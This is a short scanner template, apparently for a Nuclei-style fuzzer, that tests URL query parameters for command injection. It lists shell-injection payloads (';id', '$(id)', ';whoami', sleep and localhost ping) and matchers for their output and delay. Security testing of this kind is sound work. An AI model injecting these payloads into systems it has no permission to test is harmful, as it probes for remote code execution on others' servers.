id: rce-basic
name: Remote Code Execution
severity: critical
type: fuzz

requests:
  - method: GET
    targets: [query_params]
    fuzzing:
      - mode: replace
        payloads:
          - ";id"
          - "|id"
          - "`id`"
          - "$(id)"
          - ";whoami"
          - "& ping -c 1 127.0.0.1 &"
      - mode: append
        payloads:
          - ";sleep(5)"
          - "|sleep 5"

matchers:
  - type: regex
    part: body
    words:
      - "uid=\\d+.*gid=\\d+"
      - "root|www-data|apache"
      - "PING 127\\.0\\.0\\.1"

  - type: time        # deteksi time-based RCE
    duration: 5       # deteksi kalau response > 5 detik